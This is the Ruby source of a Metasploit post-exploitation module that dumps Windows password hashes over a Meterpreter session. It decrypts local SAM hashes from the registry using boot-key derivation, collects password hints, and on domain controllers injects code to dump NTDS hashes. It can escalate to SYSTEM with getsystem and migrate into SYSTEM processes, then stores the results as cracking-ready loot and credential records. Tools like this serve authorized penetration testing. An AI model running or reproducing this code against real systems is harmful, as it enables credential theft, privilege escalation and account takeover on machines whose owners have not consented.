##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Accounts
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather Local and Domain Controller Account Password Hashes',
        'Description'   => %q{
            This will dump local accounts from the SAM Database. If the target
          host is a Domain Controller, it will dump the Domain Account Database using the proper
          technique depending on privilege level, OS and role of the host.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
    register_options(
      [
        OptBool.new('GETSYSTEM', [ false, 'Attempt to get SYSTEM privilege on the target host.', false])

      ])
    @smb_port = 445
    # Constants for SAM decryption
    @sam_lmpass   = "LMPASSWORD\x00"
    @sam_ntpass   = "NTPASSWORD\x00"
    @sam_qwerty   = "!@\#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
    @sam_numeric  = "0123456789012345678901234567890123456789\x00"
    @sam_empty_lm = ["aad3b435b51404eeaad3b435b51404ee"].pack("H*")
    @sam_empty_nt = ["31d6cfe0d16ae931b73c59d7e0c089c0"].pack("H*")

  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")
    host = Rex::FileUtils.clean_path(sysinfo["Computer"])
    hash_file = store_loot("windows.hashes", "text/plain", session, "", "#{host}_hashes.txt", "Windows Hashes")
    print_status("Hashes will be saved to the database if one is connected.")
    print_good("Hashes will be saved in loot in JtR password file format to:")
    print_status(hash_file)
    smart_hash_dump(datastore['GETSYSTEM'], hash_file)
  end

  #-------------------------------------------------------------------------------

  def capture_hboot_key(bootkey)
    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account", KEY_READ)
    return if not ok
    vf = ok.query_value("F")
    return if not vf
    vf = vf.data
    ok.close

    hash = Digest::MD5.new
    hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)

    rc4 = OpenSSL::Cipher.new("rc4")
    rc4.key = hash.digest
    hbootkey  = rc4.update(vf[0x80, 32])
    hbootkey << rc4.final
    return hbootkey
  end
  #-------------------------------------------------------------------------------

  def capture_user_keys
    users = {}
    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users", KEY_READ)
    return if not ok

    ok.enum_key.each do |usr|
      uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{usr}", KEY_READ)
      next if usr == 'Names'
      users[usr.to_i(16)] ||={}
      users[usr.to_i(16)][:F] = uk.query_value("F").data
      users[usr.to_i(16)][:V] = uk.query_value("V").data

      #Attempt to get Hints (from Win7/Win8 Location)
      begin
        users[usr.to_i(16)][:UserPasswordHint] = uk.query_value("UserPasswordHint").data
      rescue ::Rex::Post::Meterpreter::RequestError
        users[usr.to_i(16)][:UserPasswordHint] = nil
      end

      uk.close
    end
    ok.close

    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names", KEY_READ)
    ok.enum_key.each do |usr|
      uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\#{usr}", KEY_READ)
      r = uk.query_value("")
      rid = r.type
      users[rid] ||= {}
      users[rid][:Name] = usr

      #Attempt to get Hints (from WinXP Location) only if it's not set yet
      if users[rid][:UserPasswordHint].nil?
        begin
          uk_hint = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
          users[rid][:UserPasswordHint] = uk_hint.query_value("").data
        rescue ::Rex::Post::Meterpreter::RequestError
          users[rid][:UserPasswordHint] = nil
        end
      end

      uk.close
    end
    ok.close
    users
  end
  #-------------------------------------------------------------------------------

  def decrypt_user_keys(hbootkey, users)
    users.each_key do |rid|
      user = users[rid]

      hashlm_enc = ""
      hashnt_enc = ""

      hoff = user[:V][0x9c, 4].unpack("V")[0] + 0xcc

      #Check if hashes exist (if 20, then we've got a hash)
      lm_exists = user[:V][0x9c+4,4].unpack("V")[0] == 20 ? true : false
      nt_exists = user[:V][0x9c+16,4].unpack("V")[0] == 20 ? true : false

      #If we have a hashes, then parse them (Note: NT is dependant on LM)
      hashlm_enc = user[:V][hoff + 4, 16] if lm_exists
      hashnt_enc = user[:V][(hoff + (lm_exists ? 24 : 8)), 16] if nt_exists

      user[:hashlm] = decrypt_user_hash(rid, hbootkey, hashlm_enc, @sam_lmpass)
      user[:hashnt] = decrypt_user_hash(rid, hbootkey, hashnt_enc, @sam_ntpass)
    end

    users
  end
  #-------------------------------------------------------------------------------

  def decode_windows_hint(e_string)
    d_string = ""
    e_string.scan(/..../).each do |chunk|
      bytes = chunk.scan(/../)
      d_string += (bytes[1] + bytes[0]).to_s.hex.chr
    end
    d_string
  end
  #-------------------------------------------------------------------------------

  def rid_to_key(rid)

    s1 = [rid].pack("V")
    s1 << s1[0,3]

    s2b = [rid].pack("V").unpack("C4")
    s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack("C4")
    s2 << s2[0,3]

    [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
  end
  #-------------------------------------------------------------------------------

  def decrypt_user_hash(rid, hbootkey, enchash, pass)

    if(enchash.empty?)
      case pass
      when @sam_lmpass
        return @sam_empty_lm
      when @sam_ntpass
        return @sam_empty_nt
      end
      return ""
    end

    des_k1, des_k2 = rid_to_key(rid)

    d1 = OpenSSL::Cipher.new('des-ecb')
    d1.padding = 0
    d1.key = des_k1

    d2 = OpenSSL::Cipher.new('des-ecb')
    d2.padding = 0
    d2.key = des_k2

    md5 = Digest::MD5.new
    md5.update(hbootkey[0,16] + [rid].pack("V") + pass)

    rc4 = OpenSSL::Cipher.new('rc4')
    rc4.key = md5.digest
    okey = rc4.update(enchash)

    d1o  = d1.decrypt.update(okey[0,8])
    d1o << d1.final

    d2o  = d2.decrypt.update(okey[8,8])
    d1o << d2.final
    d1o + d2o
  end
  #-------------------------------------------------------------------------------

  def read_hashdump
    host,port = session.session_host, session.session_port
    collected_hashes = ""
    tries = 1

    begin

      print_status("\tObtaining the boot key...")
      bootkey  = capture_boot_key

      print_status("\tCalculating the hboot key using SYSKEY #{bootkey.unpack("H*")[0]}...")
      hbootkey = capture_hboot_key(bootkey)

      print_status("\tObtaining the user list and keys...")
      users    = capture_user_keys

      print_status("\tDecrypting user keys...")
      users    = decrypt_user_keys(hbootkey, users)

      print_status("\tDumping password hints...")
      hint_count = 0
      users.keys.sort{|a,b| a<=>b}.each do |rid|
        #If we have a hint then print it
        if !users[rid][:UserPasswordHint].nil? && users[rid][:UserPasswordHint].length > 0
          print_good("\t#{users[rid][:Name]}:\"#{users[rid][:UserPasswordHint]}\"")
          hint_count += 1
        end
      end
      print_status("\tNo users with password hints on this system") if hint_count == 0

      print_status("\tDumping password hashes...")
      users.keys.sort{|a,b| a<=>b}.each do |rid|
        # next if guest account or support account
        next if rid == 501 or rid == 1001
        collected_hashes << "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::\n"

        print_good("\t#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::")

        service_data = {
            address: host,
            port: @smb_port,
            service_name: 'smb',
            protocol: 'tcp',
            workspace_id: myworkspace_id
        }

        credential_data = {
            origin_type: :session,
            session_id: session_db_id,
            post_reference_name: self.refname,
            private_type: :ntlm_hash,
            private_data: users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
            username: users[rid][:Name]
        }

        credential_data.merge!(service_data)

        # Create the Metasploit::Credential::Core object
        credential_core = create_credential(credential_data)

        # Assemble the options hash for creating the Metasploit::Credential::Login object
        login_data ={
            core: credential_core,
            status: Metasploit::Model::Login::Status::UNTRIED
        }

        # Merge in the service data and create our Login
        login_data.merge!(service_data)
        login = create_credential_login(login_data)
      end

    rescue ::Interrupt
      raise $!
    rescue ::Rex::Post::Meterpreter::RequestError => e
      # Sometimes we get this invalid handle race condition.
      # So let's retry a couple of times before giving up.
      # See bug #6815
      if tries < 5 and e.to_s =~ /The handle is invalid/
        print_status("Handle is invalid, retrying...")
        tries += 1
        retry

      else
        print_error("Meterpreter Exception: #{e.class} #{e}")
        print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
      end

    rescue ::Exception => e
      print_error("Error: #{e.class} #{e} #{e.backtrace}")
    end
    return collected_hashes
  end
  #-------------------------------------------------------------------------------

  def inject_hashdump
    collected_hashes = ""
    host,port = session.session_host, session.session_port
    # Load priv extension
    session.core.use("priv")
    # dump hashes
    session.priv.sam_hashes.each do |h|
      returned_hash = h.to_s.split(":")
      if returned_hash[1] == "j"
        returned_hash.delete_at(1)
      end
      rid =  returned_hash[1].to_i

      # Skip the Guest Account
      next if rid == 501 or rid == 1001

      # skip if it returns nil for an entry
      next if h == nil
      begin
        user = returned_hash[0].scan(/^[a-zA-Z0-9_\-$.]*/).join.gsub(/\.$/,"")
        lmhash = returned_hash[2].scan(/[a-f0-9]*/).join
        next if lmhash == nil
        hash_entry = "#{user}:#{rid}:#{lmhash}:#{returned_hash[3]}"
        collected_hashes << "#{hash_entry}\n"
        print_good("\t#{hash_entry}")

        service_data = {
            address: host,
            port: @smb_port,
            service_name: 'smb',
            protocol: 'tcp',
            workspace_id: myworkspace_id
        }

        credential_data = {
            origin_type: :session,
            session_id: session_db_id,
            post_reference_name: self.refname,
            private_type: :ntlm_hash,
            private_data: "#{lmhash}:#{returned_hash[3]}",
            username: user
        }

        credential_data.merge!(service_data)

        # Create the Metasploit::Credential::Core object
        credential_core = create_credential(credential_data)

        # Assemble the options hash for creating the Metasploit::Credential::Login object
        login_data ={
            core: credential_core,
            status: Metasploit::Model::Login::Status::UNTRIED
        }

        # Merge in the service data and create our Login
        login_data.merge!(service_data)
        login = create_credential_login(login_data)
      rescue
        next
      end
    end
    return collected_hashes
  end
  #-------------------------------------------------------------------------------

  # Function for checking if target is a DC
  def is_dc?
    is_dc_srv = false
    serviceskey = "HKLM\\SYSTEM\\CurrentControlSet\\Services"
    if registry_enumkeys(serviceskey).include?("NTDS")
      if registry_enumkeys(serviceskey + "\\NTDS").include?("Parameters")
        print_good("\tThis host is a Domain Controller!")
        is_dc_srv = true
      end
    end
    return is_dc_srv
  end
  #-------------------------------------------------------------------------------

  # Function to migrate to a process running as SYSTEM
  def move_to_sys
    # Make sure you got the correct SYSTEM Account Name no matter the OS Language
    local_sys = resolve_sid("S-1-5-18")
    system_account_name = "#{local_sys[:domain]}\\#{local_sys[:name]}"

    # Processes that can Blue Screen a host if migrated in to
    dangerous_processes = ["lsass.exe", "csrss.exe", "smss.exe"]

    print_status("Migrating to process owned by SYSTEM")
    session.sys.process.processes.each do |p|

      # Check we are not migrating to a process that can BSOD the host
      next if dangerous_processes.include?(p["name"])

      next if p["pid"] == session.sys.process.getpid

      if p["user"] == system_account_name
        print_status("Migrating to #{p["name"]}")
        session.core.migrate(p["pid"])
        print_good("Successfully migrated to #{p["name"]}")
        return
      end
    end
  end

  #-------------------------------------------------------------------------------

  def smart_hash_dump(migrate_system, pwdfile)
    domain_controler = is_dc?
    if not is_uac_enabled? or is_admin?
      print_status("Dumping password hashes...")
      # Check if Running as SYSTEM
      if is_system?
        # For DC's the registry read method does not work.
        if domain_controler
          begin
            file_local_write(pwdfile,inject_hashdump)
          rescue::Exception => e
            print_error("Failed to dump hashes as SYSTEM, trying to migrate to another process")

            if sysinfo['OS'] =~ /Windows (2008|2012)/i
              move_to_sys
              file_local_write(pwdfile,inject_hashdump)
            else
              print_error("Could not get NTDS hashes!")
            end
          end

          # Check if not DC
        else
          print_status "Running as SYSTEM extracting hashes from registry"
          file_local_write(pwdfile,read_hashdump)
        end

        # Check if not running as SYSTEM
      else

        # Check if Domain Controller
        if domain_controler
          begin
            file_local_write(pwdfile,inject_hashdump)
          rescue
            if migrate_system
              print_status("Trying to get SYSTEM privilege")
              results = session.priv.getsystem
              if results[0]
                print_good("Got SYSTEM privilege")
                if session.sys.config.sysinfo['OS'] =~ /Windows (2008|2012)/i
                  # Migrate process since on Windows 2008 R2 getsystem
                  # does not set certain privilege tokens required to
                  # inject and dump the hashes.
                  move_to_sys
                end
                file_local_write(pwdfile,inject_hashdump)
              else
                print_error("Could not obtain SYSTEM privileges")
              end
            else
              print_error("Could not get NTDS hashes!")
            end

          end
        elsif sysinfo['OS'] =~ /Windows (7|8|2008|2012|Vista)/i
          if migrate_system
            print_status("Trying to get SYSTEM privilege")
            results = session.priv.getsystem
            if results[0]
              print_good("Got SYSTEM privilege")
              file_local_write(pwdfile,read_hashdump)
            else
              print_error("Could not obtain SYSTEM privilege")
            end
          else
            print_error("On this version of Windows you need to be NT AUTHORITY\\SYSTEM to dump the hashes")
            print_error("Try setting GETSYSTEM to true.")
          end

        else
          if migrate_system
            print_status("Trying to get SYSTEM privilege")
            results = session.priv.getsystem
            if results[0]
              print_good("Got SYSTEM privilege")
              file_local_write(pwdfile,read_hashdump)
            else
              print_error("Could not obtain SYSTEM privileges")
            end
          else
            file_local_write(pwdfile,inject_hashdump)
          end

        end

      end
    else
      print_error("Insufficient privileges to dump hashes!")
    end
  end
end
